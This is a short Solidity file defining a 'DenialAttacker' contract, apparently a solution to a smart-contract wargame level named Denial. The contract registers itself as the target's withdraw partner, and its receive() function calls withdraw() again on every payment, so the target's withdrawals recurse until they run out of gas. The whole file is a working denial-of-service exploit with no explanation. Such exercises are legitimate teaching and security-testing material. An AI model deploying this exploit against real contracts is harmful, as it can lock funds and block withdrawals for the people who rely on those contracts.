pragma solidity ^0.8.0;

interface IDenial {
    function withdraw() external;
    function setWithdrawPartner(address) external;
}

contract DenialAttacker {
    address target;

    constructor(address _target) {
        target = _target;
    }

    function attack() public {
        IDenial(target).setWithdrawPartner(address(this));
    }

    receive() external payable {
        IDenial(target).withdraw();
    }
}
